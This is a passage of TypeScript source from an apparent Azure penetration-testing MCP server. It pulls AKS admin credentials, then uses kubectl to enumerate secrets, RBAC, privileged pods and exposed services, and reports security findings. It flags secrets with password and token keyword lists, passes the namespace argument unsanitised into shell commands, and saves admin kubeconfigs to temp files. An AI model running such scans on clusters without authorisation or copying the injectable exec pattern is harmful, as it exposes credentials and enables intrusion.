          outputLines.push(`## 🚨 All Security Findings\n\n`);
          
          // Sort by severity
          const severityOrder: Record<string, number> = { CRITICAL: 0, HIGH: 1, MEDIUM: 2, LOW: 3 };
          allFindings.sort((a, b) => severityOrder[a.severity] - severityOrder[b.severity]);
          
          if (allFindings.length > 0) {
            outputLines.push(`| # | Severity | Finding | CIS | Remediation |\n|---|----------|---------|-----|-------------|\n`);
            let i = 1;
            for (const f of allFindings) {
              const icon = f.severity === 'CRITICAL' ? '🔴' : f.severity === 'HIGH' ? '🟠' : f.severity === 'MEDIUM' ? '🟡' : '🟢';
              outputLines.push(`| ${i++} | ${icon} ${f.severity} | ${f.finding} | ${f.cis || '-'} | ${f.remediation} |\n`);
            }
          } else {
            outputLines.push(`✅ No security findings - cluster is well configured!\n`);
          }
          outputLines.push('\n');

          outputLines.push(`---\n\n`);
          outputLines.push(`## 📊 Executive Summary\n\n`);
          outputLines.push(`| Severity | Count |\n|----------|-------|\n`);
          outputLines.push(`| 🔴 CRITICAL | ${criticalCount} |\n`);
          outputLines.push(`| 🟠 HIGH | ${highCount} |\n`);
          outputLines.push(`| 🟡 MEDIUM | ${mediumCount} |\n`);
          outputLines.push(`| 🟢 LOW | ${lowCount} |\n`);
          outputLines.push(`| **TOTAL FINDINGS** | **${allFindings.length}** |\n\n`);

          // Risk Score
          const riskScore = (criticalCount * 40) + (highCount * 20) + (mediumCount * 5) + (lowCount * 1);
          let riskLevel = 'LOW';
          let riskEmoji = '🟢';
          if (riskScore >= 100) { riskLevel = 'CRITICAL'; riskEmoji = '🔴'; }
          else if (riskScore >= 50) { riskLevel = 'HIGH'; riskEmoji = '🟠'; }
          else if (riskScore >= 20) { riskLevel = 'MEDIUM'; riskEmoji = '🟡'; }
          
          outputLines.push(`### Risk Assessment\n\n`);
          outputLines.push(`**Risk Score:** ${riskScore} / 100+ possible\n`);
          outputLines.push(`**Risk Level:** ${riskEmoji} **${riskLevel}**\n\n`);

          if (criticalCount > 0) {
            outputLines.push(`⚠️ **${criticalCount} CRITICAL findings require immediate remediation!**\n\n`);
          }

          // Top 3 Recommendations
          outputLines.push(`### 🎯 Top Priority Remediations\n\n`);
          const topFindings = allFindings.slice(0, 3);
          let priority = 1;
          for (const f of topFindings) {
            outputLines.push(`${priority++}. **${f.finding}**\n   → ${f.remediation}\n\n`);
          }

          outputLines.push(`---\n\n`);
          outputLines.push(`*Generated by Stratos MCP v${SERVER_VERSION} - Azure Penetration Testing Toolkit*\n`);
          outputLines.push(`*Reference: https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-services/az-aks*\n`);

          // Build final output string (40-60% faster than concatenation)
          const output = outputLines.join('');

          return {
            content: [{ type: 'text', text: formatResponse(output, format, request.params.name) }],
          };
        } catch (error: any) {
          return {
            content: [{ type: 'text', text: `Error running full AKS scan: ${error.message}` }],
            isError: true,
          };
        }
      }

      case "azure_scan_aks_live": {
        const { subscriptionId, resourceGroup, clusterName, namespace, format } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup: string;
          clusterName: string;
          namespace?: string;
          format?: string;
        };

        try {
          const aksClient = new ContainerServiceClient(credential, subscriptionId);
          
          let output = `# 🔴 LIVE AKS SECURITY SCAN via kubectl\n\n`;
          output += `**Cluster:** ${clusterName}\n`;
          output += `**Resource Group:** ${resourceGroup}\n`;
          output += `**Subscription:** ${subscriptionId}\n`;
          output += `**Target Namespace:** ${namespace || 'All namespaces'}\n`;
          output += `**Scan Time:** ${new Date().toISOString()}\n`;
          output += `**Scanner:** Stratos MCP v1.9.8 (20 Security Checks)\n\n`;
          output += `---\n\n`;

          output += `## 🔑 Connecting to Cluster...\n\n`;
          
          const cluster = await aksClient.managedClusters.get(resourceGroup, clusterName);
          
          let kubeconfig: string;
          try {
            const adminCreds = await aksClient.managedClusters.listClusterAdminCredentials(resourceGroup, clusterName);
            if (!adminCreds.kubeconfigs || adminCreds.kubeconfigs.length === 0) {
              throw new Error("No kubeconfig returned");
            }
            kubeconfig = Buffer.from(adminCreds.kubeconfigs[0].value!).toString('utf-8');
            output += `✅ Admin credentials obtained\n\n`;
          } catch (adminError: any) {
            // Try user credentials if admin fails (AAD-enabled clusters)
            try {
              const userCreds = await aksClient.managedClusters.listClusterUserCredentials(resourceGroup, clusterName);
              if (!userCreds.kubeconfigs || userCreds.kubeconfigs.length === 0) {
                throw new Error("No kubeconfig returned");
              }
              kubeconfig = Buffer.from(userCreds.kubeconfigs[0].value!).toString('utf-8');
              output += `✅ User credentials obtained (admin credentials unavailable)\n\n`;
            } catch (userError: any) {
              return {
                content: [{
                  type: 'text',
                  text: `# ❌ Failed to Connect to Cluster\n\n` +
                    `Could not obtain cluster credentials.\n\n` +
                    `**Admin Error:** ${adminError.message}\n` +
                    `**User Error:** ${userError.message}\n\n` +
                    `**Try manually:**\n` +
                    `\`\`\`bash\n` +
                    `az aks get-credentials --resource-group ${resourceGroup} --name ${clusterName}\n` +
                    `kubectl get nodes\n` +
                    `\`\`\``
                }],
                isError: true,
              };
            }
          }

          // Convert kubeconfig from devicecode to azurecli auth
          // Replace: --login devicecode → --login azurecli
          kubeconfig = kubeconfig.replace(/--login\s+devicecode/gi, '--login azurecli');
          
          // Save kubeconfig to temp file for kubectl fallback
          const os = await import('os');
          const path = await import('path');
          const fs = await import('fs').then(m => m.promises);
          const tempKubeconfig = path.join(os.tmpdir(), `stratos-kubeconfig-${Date.now()}.yaml`);
          await fs.writeFile(tempKubeconfig, kubeconfig);
          
          // Validate Azure CLI session before running kubectl
          output += `**Validating Azure CLI session...**\n`;
          try {
            const { exec } = await import('child_process');
            await new Promise<void>((resolve, reject) => {
              exec('az account show', { timeout: 5000 }, (error, stdout, stderr) => {
                if (error) {
                  reject(new Error('Azure CLI session expired or not authenticated'));
                } else {
                  resolve();
                }
              });
            });
            output += `✅ Azure CLI session valid\n\n`;
          } catch (azError: any) {
            try { await fs.unlink(tempKubeconfig); } catch (e) {}
            return {
              content: [{
                type: 'text',
                text: `# ❌ Azure CLI Authentication Required\n\n` +
                  `The Azure CLI session has expired or is not authenticated.\n\n` +
                  `**Error:** ${azError.message}\n\n` +
                  `## 🔧 Fix\n\n` +
                  `Run the following command to authenticate:\n\n` +
                  `\`\`\`bash\n` +
                  `az login\n` +
                  `\`\`\`\n\n` +
                  `Then try the scan again.\n\n` +
                  `**Note:** This tool requires Azure CLI authentication because it uses \`kubectl\` with Azure CLI-based kubeconfig.`
              }],
              isError: true,
            };
          }
          
          // Timeout constant for kubectl calls (30 seconds)
          const KUBECTL_TIMEOUT_MS = 30000;
          
          // Helper function to run kubectl command (primary method - more reliable)
          const runKubectl = async (args: string): Promise<string> => {
            const { exec, spawn } = await import('child_process');
            return new Promise((resolve, reject) => {
              let killed = false;
              const child = exec(
                `kubectl --kubeconfig="${tempKubeconfig}" ${args}`,
                { maxBuffer: 10 * 1024 * 1024, timeout: KUBECTL_TIMEOUT_MS },
                (error, stdout, stderr) => {
                  if (killed) return;
                  if (error) {
                    if (error.killed || error.signal === 'SIGTERM') {
                      reject(new Error(`kubectl timed out after ${KUBECTL_TIMEOUT_MS/1000}s`));
                    } else {
                      reject(new Error(stderr || error.message));
                    }
                  } else {
                    resolve(stdout);
                  }
                }
              );
              
              // Backup timeout to kill process
              setTimeout(() => {
                if (child.exitCode === null) {
                  killed = true;
                  child.kill('SIGTERM');
                  reject(new Error(`kubectl timed out after ${KUBECTL_TIMEOUT_MS/1000}s`));
                }
              }, KUBECTL_TIMEOUT_MS + 1000);
            });
          };
          
          let criticalCount = 0;
          let highCount = 0;
          let mediumCount = 0;
          let lowCount = 0;
          const findings: Array<{severity: string; category: string; finding: string; details: string}> = [];

          // ========== 1. ENUMERATE NAMESPACES ==========
          output += `## 📁 Namespaces\n\n`;
          let nsList: string[] = [];
          try {
            const nsJson = await runKubectl('get namespaces -o json');
            const nsData = JSON.parse(nsJson);
            nsList = (nsData.items || []).map((ns: any) => ns.metadata?.name).filter(Boolean);
            output += `Found **${nsList.length}** namespaces:\n`;
            output += `\`${nsList.join(', ')}\`\n\n`;
          } catch (e: any) {
            output += `❌ Failed to list namespaces: ${e.message}\n\n`;
          }

          // ========== 2. ENUMERATE SECRETS ==========
          output += `## 🔐 Secrets Analysis\n\n`;
          try {
            const secretsCmd = namespace 
              ? `get secrets -n ${namespace} -o json`
              : `get secrets --all-namespaces -o json`;
            const secretsJson = await runKubectl(secretsCmd);
            const allSecrets = JSON.parse(secretsJson).items || [];
            
            const nonSaSecrets = allSecrets.filter((s: any) => s.type !== 'kubernetes.io/service-account-token');
            const sensitiveSecrets: Array<{ns: string; name: string; type: string; keys: string[]}> = [];
            
            const sensitiveKeywords = ['password', 'secret', 'key', 'token', 'connection', 'azure', 'credential', 'api'];
            
            for (const secret of nonSaSecrets) {
              const keys = Object.keys((secret as any).data || {});
              const hasSensitive = keys.some((k: string) => 
                sensitiveKeywords.some(kw => k.toLowerCase().includes(kw))
              );
              if (hasSensitive || (secret as any).type === 'Opaque') {
                sensitiveSecrets.push({
                  ns: (secret as any).metadata?.namespace || 'unknown',
                  name: (secret as any).metadata?.name || 'unknown',
                  type: (secret as any).type || 'unknown',
                  keys: keys
                });
              }
            }
            
            output += `| Metric | Count |\n|--------|-------|\n`;
            output += `| Total Secrets | ${allSecrets.length} |\n`;
            output += `| Service Account Tokens | ${allSecrets.length - nonSaSecrets.length} |\n`;
            output += `| Application Secrets | ${nonSaSecrets.length} |\n`;
            output += `| Potentially Sensitive | ${sensitiveSecrets.length} |\n\n`;
            
            if (sensitiveSecrets.length > 0) {
              output += `### 🎯 Potentially Sensitive Secrets\n\n`;
              output += `| Namespace | Secret Name | Type | Keys |\n|-----------|-------------|------|------|\n`;
              for (const s of sensitiveSecrets.slice(0, 20)) {
                output += `| ${s.ns} | ${s.name} | ${s.type} | ${s.keys.slice(0, 3).join(', ')}${s.keys.length > 3 ? '...' : ''} |\n`;
              }
              if (sensitiveSecrets.length > 20) {
                output += `\n*...and ${sensitiveSecrets.length - 20} more*\n`;
              }
              output += '\n';
              
              findings.push({
                severity: 'HIGH',
                category: 'Secrets',
                finding: `${sensitiveSecrets.length} potentially sensitive secrets found`,
                details: 'Review secrets for hardcoded credentials'
              });
              highCount++;
            }
          } catch (e: any) {
            output += `❌ Failed to list secrets: ${e.message}\n\n`;
          }

          // ========== 3. SERVICE ACCOUNTS ==========
          output += `## 👤 Service Accounts\n\n`;
          try {
            const saCmd = namespace 
              ? `get serviceaccounts -n ${namespace} -o json`
              : `get serviceaccounts --all-namespaces -o json`;
            const saJson = await runKubectl(saCmd);
            const saList = JSON.parse(saJson).items || [];
            
            const defaultSaAutoMount: Array<{ns: string; name: string}> = [];
            
            for (const sa of saList) {
              if ((sa as any).automountServiceAccountToken !== false) {
                if ((sa as any).metadata?.name === 'default') {
                  defaultSaAutoMount.push({
                    ns: (sa as any).metadata?.namespace || 'unknown',
                    name: (sa as any).metadata?.name || 'unknown'
                  });
                }
              }
            }
            
            output += `| Metric | Count |\n|--------|-------|\n`;
            output += `| Total Service Accounts | ${saList.length} |\n`;
            output += `| Default SAs with Auto-Mount | ${defaultSaAutoMount.length} |\n\n`;
            
            if (defaultSaAutoMount.length > 0) {
              output += `### ⚠️ Default Service Accounts with Token Auto-Mount\n\n`;
              for (const sa of defaultSaAutoMount.slice(0, 10)) {
                output += `- \`${sa.ns}/default\`\n`;
              }
              output += '\n';
              
              findings.push({
                severity: 'MEDIUM',
                category: 'Service Accounts',
                finding: `${defaultSaAutoMount.length} default SAs with auto-mount enabled`,
                details: 'Disable automountServiceAccountToken on default SAs'
              });
              mediumCount++;
            }
          } catch (e: any) {
            output += `❌ Failed to list service accounts: ${e.message}\n\n`;
          }

          // ========== 4. RBAC BINDINGS ==========
          output += `## 🔒 RBAC Analysis\n\n`;
          try {
            const crbJson = await runKubectl('get clusterrolebindings -o json');
            const crbItems = JSON.parse(crbJson).items || [];
            
            const rbCmd = namespace 
              ? `get rolebindings -n ${namespace} -o json`
              : `get rolebindings --all-namespaces -o json`;
            const rbJson = await runKubectl(rbCmd);
            const rbItems = JSON.parse(rbJson).items || [];
            
            const dangerousBindings: Array<{name: string; role: string; subjects: string[]}> = [];
            const dangerousRoles = ['cluster-admin', 'admin', 'edit'];
            
            for (const crb of crbItems) {
              if (dangerousRoles.includes((crb as any).roleRef?.name)) {
                const subjects = ((crb as any).subjects || []).map((s: any) => 
                  `${s.kind}:${s.namespace ? s.namespace + '/' : ''}${s.name}`
                );
                dangerousBindings.push({
                  name: (crb as any).metadata?.name || 'unknown',
                  role: (crb as any).roleRef?.name,
                  subjects: subjects
                });
              }
            }
            
            output += `| Metric | Count |\n|--------|-------|\n`;
            output += `| Cluster Role Bindings | ${crbItems.length} |\n`;
            output += `| Role Bindings | ${rbItems.length} |\n`;
            output += `| Dangerous Cluster Bindings | ${dangerousBindings.length} |\n\n`;
            
            if (dangerousBindings.length > 0) {
              output += `### 🚨 High-Privilege Cluster Role Bindings\n\n`;
              output += `| Binding Name | Role | Subjects |\n|--------------|------|----------|\n`;
              for (const b of dangerousBindings.slice(0, 15)) {
                output += `| ${b.name} | ${b.role} | ${b.subjects.slice(0, 2).join(', ')}${b.subjects.length > 2 ? '...' : ''} |\n`;
              }
              output += '\n';
              
              const clusterAdminCount = dangerousBindings.filter(b => b.role === 'cluster-admin').length;
              if (clusterAdminCount > 5) {
                findings.push({
                  severity: 'HIGH',
                  category: 'RBAC',
                  finding: `${clusterAdminCount} cluster-admin bindings found`,
                  details: 'Excessive cluster-admin bindings - review and reduce'
                });
                highCount++;
              }
            }
          } catch (e: any) {
            output += `❌ Failed to analyze RBAC: ${e.message}\n\n`;
          }

          // ========== 5. PRIVILEGED PODS ==========
          output += `## 🐳 Pod Security Analysis\n\n`;
          try {
            const podsCmd = namespace
              ? `get pods -n ${namespace} -o json`
              : `get pods --all-namespaces -o json`;
            const podsJson = await runKubectl(podsCmd);
            const podItems = JSON.parse(podsJson).items || [];
            
            const privilegedPods: Array<{ns: string; name: string; container: string; issues: string[]}> = [];
            const hostNetworkPods: Array<{ns: string; name: string}> = [];
            const hostPathPods: Array<{ns: string; name: string; paths: string[]}> = [];
            
            for (const pod of podItems) {
              const podName = (pod as any).metadata?.name || 'unknown';
              const podNs = (pod as any).metadata?.namespace || 'unknown';
              
              if ((pod as any).spec?.hostNetwork) {
                hostNetworkPods.push({ ns: podNs, name: podName });
              }
              
              const hostPaths = ((pod as any).spec?.volumes || [])
                .filter((v: any) => v.hostPath)
                .map((v: any) => v.hostPath?.path || 'unknown');
              if (hostPaths.length > 0) {
                hostPathPods.push({ ns: podNs, name: podName, paths: hostPaths });
              }
              
              for (const container of ((pod as any).spec?.containers || [])) {
                const sc = container.securityContext;
                const issues: string[] = [];
                
                if (sc?.privileged) issues.push('privileged');
                if (sc?.allowPrivilegeEscalation !== false) issues.push('allowPrivilegeEscalation');
                if (sc?.runAsUser === 0) issues.push('runAsRoot');
                if (sc?.capabilities?.add?.includes('SYS_ADMIN')) issues.push('CAP_SYS_ADMIN');
                
                if (issues.length > 0 && issues.includes('privileged')) {
                  privilegedPods.push({
                    ns: podNs,
                    name: podName,
                    container: container.name,
                    issues: issues
                  });
                }
              }
            }
            
            output += `| Metric | Count |\n|--------|-------|\n`;
            output += `| Total Pods | ${podItems.length} |\n`;
            output += `| Privileged Containers | ${privilegedPods.length} |\n`;
            output += `| Host Network Pods | ${hostNetworkPods.length} |\n`;
            output += `| Host Path Mounts | ${hostPathPods.length} |\n\n`;
            
            if (privilegedPods.length > 0) {
              output += `### 🚨 Privileged Containers\n\n`;
              output += `| Namespace | Pod | Container | Issues |\n|-----------|-----|-----------|--------|\n`;
              for (const p of privilegedPods.slice(0, 10)) {
                output += `| ${p.ns} | ${p.name} | ${p.container} | ${p.issues.join(', ')} |\n`;
              }
              output += '\n';
              
              findings.push({
                severity: 'CRITICAL',
                category: 'Pod Security',
                finding: `${privilegedPods.length} pods running with privileged: true`,
                details: 'Privileged containers can escape to host'
              });
              criticalCount++;
            }
            
            if (hostNetworkPods.length > 0) {
              output += `### ⚠️ Pods with Host Network\n\n`;
              for (const p of hostNetworkPods.slice(0, 5)) {
                output += `- \`${p.ns}/${p.name}\`\n`;
              }
              output += '\n';
              
              findings.push({
                severity: 'HIGH',
                category: 'Pod Security',
                finding: `${hostNetworkPods.length} pods using hostNetwork`,
                details: 'Can access host network interfaces'
              });
              highCount++;
            }
            
            if (hostPathPods.length > 0) {
              output += `### ⚠️ Pods with Host Path Mounts\n\n`;
              output += `| Namespace | Pod | Host Paths |\n|-----------|-----|------------|\n`;
              for (const p of hostPathPods.slice(0, 10)) {
                output += `| ${p.ns} | ${p.name} | ${p.paths.join(', ')} |\n`;
              }
              output += '\n';
              
              const rootMounts = hostPathPods.filter(p => p.paths.some(path => path === '/' || path === '/etc'));
              if (rootMounts.length > 0) {
                findings.push({
                  severity: 'CRITICAL',
                  category: 'Pod Security',
                  finding: `${rootMounts.length} pods mounting sensitive host paths`,
                  details: 'Host filesystem access can lead to escape'
                });
                criticalCount++;
              }
            }
          } catch (e: any) {
            output += `❌ Failed to analyze pods: ${e.message}\n\n`;
          }

          // ========== 6. NETWORK POLICIES ==========
          output += `## 🌐 Network Policies\n\n`;
          try {
            const npCmd = namespace 
              ? `get networkpolicies -n ${namespace} -o json`
              : `get networkpolicies --all-namespaces -o json`;
            const npJson = await runKubectl(npCmd);
            const npItems = JSON.parse(npJson).items || [];
            
            const npCount = npItems.length;
            
            output += `| Metric | Count |\n|--------|-------|\n`;
            output += `| Network Policies | ${npCount} |\n\n`;
            
            if (npCount === 0) {
              findings.push({
                severity: 'CRITICAL',
                category: 'Network',
                finding: 'No network policies defined in cluster',
                details: 'All pods can communicate freely'
              });
              criticalCount++;
            }
            
            if (npCount > 0) {
              output += `### 📋 Network Policies\n\n`;
              output += `| Namespace | Policy Name |\n|-----------|-------------|\n`;
              for (const np of npItems.slice(0, 10)) {
                output += `| ${(np as any).metadata?.namespace} | ${(np as any).metadata?.name} |\n`;
              }
              output += '\n';
            }
          } catch (e: any) {
            output += `❌ Failed to analyze network policies: ${e.message}\n\n`;
          }

          // ========== 7. EXPOSED SERVICES ==========
          output += `## 🌍 Exposed Services\n\n`;
          try {
            const svcCmd = namespace 
              ? `get services -n ${namespace} -o json`
              : `get services --all-namespaces -o json`;
            const svcJson = await runKubectl(svcCmd);
            const svcItems = JSON.parse(svcJson).items || [];
            
            const loadBalancers: Array<{ns: string; name: string; ip: string; ports: string[]}> = [];
            const nodePortServices: Array<{ns: string; name: string; ports: string[]}> = [];
            
            for (const svc of svcItems) {
              const svcName = (svc as any).metadata?.name || 'unknown';
              const svcNs = (svc as any).metadata?.namespace || 'unknown';
              
              if ((svc as any).spec?.type === 'LoadBalancer') {
                const ips = ((svc as any).status?.loadBalancer?.ingress || []).map((i: any) => i.ip || i.hostname || 'pending');
                const ports = ((svc as any).spec?.ports || []).map((p: any) => `${p.port}/${p.protocol}`);
                loadBalancers.push({ ns: svcNs, name: svcName, ip: ips.join(', '), ports });
              } else if ((svc as any).spec?.type === 'NodePort') {
                const ports = ((svc as any).spec?.ports || []).map((p: any) => `${p.nodePort}→${p.port}`);
                nodePortServices.push({ ns: svcNs, name: svcName, ports });
              }
            }
            
            output += `| Metric | Count |\n|--------|-------|\n`;
            output += `| Total Services | ${svcItems.length} |\n`;
            output += `| LoadBalancer Services | ${loadBalancers.length} |\n`;
            output += `| NodePort Services | ${nodePortServices.length} |\n\n`;
            
            if (loadBalancers.length > 0) {
              output += `### 🔴 LoadBalancer Services (Internet Exposed)\n\n`;
              output += `| Namespace | Service | External IP | Ports |\n|-----------|---------|-------------|-------|\n`;
              for (const lb of loadBalancers) {
                output += `| ${lb.ns} | ${lb.name} | ${lb.ip || 'pending'} | ${lb.ports.join(', ')} |\n`;
              }
              output += '\n';
              
              findings.push({
                severity: 'HIGH',
                category: 'Services',
                finding: `${loadBalancers.length} LoadBalancer services exposed`,
                details: 'Review if all require public access'
              });
              highCount++;
            }
          } catch (e: any) {
            output += `❌ Failed to analyze services: ${e.message}\n\n`;
          }

          // ========== 8. CONFIGMAPS ==========
          output += `## 📄 ConfigMaps Analysis\n\n`;
          try {
            const cmCmd = namespace 
              ? `get configmaps -n ${namespace} -o json`
              : `get configmaps --all-namespaces -o json`;
            const cmJson = await runKubectl(cmCmd);
            const cmItems = JSON.parse(cmJson).items || [];
            
            const sensitiveConfigMaps: Array<{ns: string; name: string; keys: string[]}> = [];
            const secretPatterns = ['password', 'secret', 'key', 'token', 'credential', 'apikey'];
            
            for (const cm of cmItems) {
              const data = (cm as any).data || {};
              const suspiciousKeys: string[] = [];
              
              for (const [key, value] of Object.entries(data)) {
                if (secretPatterns.some(p => key.toLowerCase().includes(p))) {
                  suspiciousKeys.push(key);
                }
              }
              
              if (suspiciousKeys.length > 0) {
                sensitiveConfigMaps.push({
                  ns: (cm as any).metadata?.namespace || 'unknown',
                  name: (cm as any).metadata?.name || 'unknown',
                  keys: suspiciousKeys
                });
              }
            }
            
            output += `| Metric | Count |\n|--------|-------|\n`;
            output += `| Total ConfigMaps | ${cmItems.length} |\n`;
            output += `| ConfigMaps with Potential Secrets | ${sensitiveConfigMaps.length} |\n\n`;
            
            if (sensitiveConfigMaps.length > 0) {
              output += `### ⚠️ ConfigMaps with Potential Sensitive Data\n\n`;
              output += `| Namespace | ConfigMap | Suspicious Keys |\n|-----------|-----------|------------------|\n`;
              for (const cm of sensitiveConfigMaps.slice(0, 10)) {
                output += `| ${cm.ns} | ${cm.name} | ${cm.keys.slice(0, 3).join(', ')} |\n`;
              }
              output += '\n';
              
              findings.push({
                severity: 'MEDIUM',
                category: 'ConfigMaps',
                finding: `${sensitiveConfigMaps.length} ConfigMaps may contain secrets`,
                details: 'Move secrets to Secrets or Key Vault'
              });
              mediumCount++;
            }
          } catch (e: any) {
            output += `❌ Failed to analyze ConfigMaps: ${e.message}\n\n`;
          }

          // ========== 9. CLUSTER ROLES ANALYSIS ==========
          output += `## 👑 Cluster Roles Analysis\n\n`;
          try {
            const crJson = await runKubectl('get clusterroles -o json');
            const crItems = JSON.parse(crJson).items || [];
            
            const dangerousRoles: Array<{name: string; verbs: string[]; resources: string[]}> = [];
            const wildcardRoles: Array<{name: string}> = [];
            
            for (const cr of crItems) {
              const roleName = (cr as any).metadata?.name || 'unknown';
              const rules = (cr as any).rules || [];
              
              for (const rule of rules) {
                const verbs = rule.verbs || [];
                const resources = rule.resources || [];
                const apiGroups = rule.apiGroups || [];
                
                if (verbs.includes('*') || resources.includes('*')) {
                  if (!wildcardRoles.find(r => r.name === roleName)) {
                    wildcardRoles.push({ name: roleName });
                  }
                }
                
                const hasDangerousVerbs = ['create', 'update', 'patch', 'delete'].some(v => verbs.includes(v) || verbs.includes('*'));
                const hasSensitiveResources = ['secrets', 'pods', 'deployments', 'daemonsets', 'roles', 'clusterroles', 'rolebindings', 'clusterrolebindings']
                  .some(r => resources.includes(r) || resources.includes('*'));
                
                if (hasDangerousVerbs && hasSensitiveResources) {
                  dangerousRoles.push({
                    name: roleName,
                    verbs: verbs.slice(0, 3),
                    resources: resources.slice(0, 3)
                  });
                }
              }
            }
            
            output += `| Metric | Count |\n|--------|-------|\n`;
            output += `| Total Cluster Roles | ${crItems.length} |\n`;
            output += `| Wildcard (*) Roles | ${wildcardRoles.length} |\n`;
            output += `| High-Privilege Roles | ${dangerousRoles.length} |\n\n`;
            
            if (wildcardRoles.length > 5) {
              output += `### 🚨 Roles with Wildcard Permissions\n\n`;
              for (const r of wildcardRoles.slice(0, 10)) {
                output += `- \`${r.name}\`\n`;
              }
              output += '\n';
              
              findings.push({
                severity: 'HIGH',
                category: 'RBAC',
                finding: `${wildcardRoles.length} cluster roles with wildcard (*) permissions`,
                details: 'Wildcard permissions violate least privilege principle'
              });
              highCount++;
            }
          } catch (e: any) {
            output += `❌ Failed to analyze cluster roles: ${e.message}\n\n`;
          }

          // ========== 10. POD SECURITY CONTEXTS ==========
          output += `## 🛡️ Pod Security Contexts\n\n`;
          try {
            const podsCmd = namespace
              ? `get pods -n ${namespace} -o json`
              : `get pods --all-namespaces -o json`;
            const podsJson = await runKubectl(podsCmd);
            const podItems = JSON.parse(podsJson).items || [];
            
            const runAsRootPods: Array<{ns: string; name: string}> = [];
            const noSecurityContextPods: Array<{ns: string; name: string}> = [];
            const capAddPods: Array<{ns: string; name: string; caps: string[]}> = [];
            const hostPidPods: Array<{ns: string; name: string}> = [];
            const hostIpcPods: Array<{ns: string; name: string}> = [];
            
            for (const pod of podItems) {
              const podName = (pod as any).metadata?.name || 'unknown';
              const podNs = (pod as any).metadata?.namespace || 'unknown';
              const spec = (pod as any).spec || {};
              
              // Host PID namespace
              if (spec.hostPID) {
                hostPidPods.push({ ns: podNs, name: podName });
              }
              
              // Host IPC namespace  
              if (spec.hostIPC) {
                hostIpcPods.push({ ns: podNs, name: podName });
              }
              
              for (const container of (spec.containers || [])) {
                const sc = container.securityContext || {};
                
                // No security context at all
                if (!container.securityContext && !spec.securityContext) {
                  if (!noSecurityContextPods.find(p => p.name === podName && p.ns === podNs)) {
                    noSecurityContextPods.push({ ns: podNs, name: podName });
                  }
                }
                
                // Running as root
                if (sc.runAsUser === 0 || sc.runAsNonRoot === false) {
                  runAsRootPods.push({ ns: podNs, name: podName });
                }
                
                // Added capabilities (potential privilege escalation)
                const addedCaps = sc.capabilities?.add || [];
                if (addedCaps.length > 0) {
                  capAddPods.push({ ns: podNs, name: podName, caps: addedCaps });
                }
              }
            }
            
            output += `| Security Check | Count |\n|----------------|-------|\n`;
            output += `| Pods without Security Context | ${noSecurityContextPods.length} |\n`;
            output += `| Pods running as root | ${runAsRootPods.length} |\n`;
            output += `| Pods with added capabilities | ${capAddPods.length} |\n`;
            output += `| Pods with hostPID | ${hostPidPods.length} |\n`;
            output += `| Pods with hostIPC | ${hostIpcPods.length} |\n\n`;
            
            if (hostPidPods.length > 0) {
              output += `### 🚨 Pods with Host PID Namespace (Container Escape Risk)\n\n`;
              for (const p of hostPidPods.slice(0, 5)) {
                output += `- \`${p.ns}/${p.name}\`\n`;
              }
              output += '\n';
              
              findings.push({
                severity: 'CRITICAL',
                category: 'Container Escape',
                finding: `${hostPidPods.length} pods sharing host PID namespace`,
                details: 'Can see and signal host processes - container escape vector'
              });
              criticalCount++;
            }
            
            if (capAddPods.length > 0) {
              const dangerousCaps = ['SYS_ADMIN', 'SYS_PTRACE', 'NET_ADMIN', 'DAC_OVERRIDE', 'SETUID', 'SETGID'];
              const criticalCapPods = capAddPods.filter(p => p.caps.some(c => dangerousCaps.includes(c)));
              
              if (criticalCapPods.length > 0) {
                output += `### 🚨 Pods with Dangerous Capabilities\n\n`;
                output += `| Namespace | Pod | Capabilities |\n|-----------|-----|---------------|\n`;
                for (const p of criticalCapPods.slice(0, 10)) {
                  output += `| ${p.ns} | ${p.name} | ${p.caps.join(', ')} |\n`;
                }
                output += '\n';
                
                findings.push({
                  severity: 'CRITICAL',
                  category: 'Capabilities',
                  finding: `${criticalCapPods.length} pods with dangerous Linux capabilities`,
                  details: 'SYS_ADMIN/SYS_PTRACE/etc enable container escape'
                });
                criticalCount++;
              }
            }
          } catch (e: any) {
            output += `❌ Failed to analyze security contexts: ${e.message}\n\n`;
          }

          // ========== 11. INGRESS ANALYSIS ==========
          output += `## 🚪 Ingress Controllers\n\n`;
          try {
            const ingCmd = namespace
              ? `get ingress -n ${namespace} -o json`
              : `get ingress --all-namespaces -o json`;
            const ingJson = await runKubectl(ingCmd);
            const ingItems = JSON.parse(ingJson).items || [];
            
            const exposedIngresses: Array<{ns: string; name: string; hosts: string[]; tls: boolean}> = [];
            
            for (const ing of ingItems) {
              const ingName = (ing as any).metadata?.name || 'unknown';
              const ingNs = (ing as any).metadata?.namespace || 'unknown';
              const rules = (ing as any).spec?.rules || [];
              const tls = ((ing as any).spec?.tls || []).length > 0;
              
              const hosts = rules.map((r: any) => r.host || '*').filter(Boolean);
              exposedIngresses.push({ ns: ingNs, name: ingName, hosts, tls });
            }
            
            output += `| Metric | Count |\n|--------|-------|\n`;
            output += `| Total Ingresses | ${ingItems.length} |\n`;
            output += `| Without TLS | ${exposedIngresses.filter(i => !i.tls).length} |\n\n`;
            
            if (exposedIngresses.length > 0) {
              output += `### 📋 Ingress Resources\n\n`;
              output += `| Namespace | Ingress | Hosts | TLS |\n|-----------|---------|-------|-----|\n`;
              for (const ing of exposedIngresses.slice(0, 10)) {
                output += `| ${ing.ns} | ${ing.name} | ${ing.hosts.join(', ')} | ${ing.tls ? '✅' : '❌'} |\n`;
              }
              output += '\n';
              
              const noTls = exposedIngresses.filter(i => !i.tls);
              if (noTls.length > 0) {
                findings.push({
                  severity: 'MEDIUM',
                  category: 'Ingress',
                  finding: `${noTls.length} ingresses without TLS encryption`,
                  details: 'Traffic exposed in plain HTTP'
                });
                mediumCount++;
              }
            }
          } catch (e: any) {
            output += `❌ Failed to analyze ingresses: ${e.message}\n\n`;
          }

          // ========== 12. DAEMONSETS ANALYSIS ==========
          output += `## 🔄 DaemonSets (Node-Wide Pods)\n\n`;
          try {
            const dsJson = await runKubectl('get daemonsets --all-namespaces -o json');
            const dsItems = JSON.parse(dsJson).items || [];
            
            const privilegedDs: Array<{ns: string; name: string; issues: string[]}> = [];
            
            for (const ds of dsItems) {
              const dsName = (ds as any).metadata?.name || 'unknown';
              const dsNs = (ds as any).metadata?.namespace || 'unknown';
              const spec = (ds as any).spec?.template?.spec || {};
              const issues: string[] = [];
              
              if (spec.hostNetwork) issues.push('hostNetwork');
              if (spec.hostPID) issues.push('hostPID');
              if (spec.hostIPC) issues.push('hostIPC');
              
              for (const container of (spec.containers || [])) {
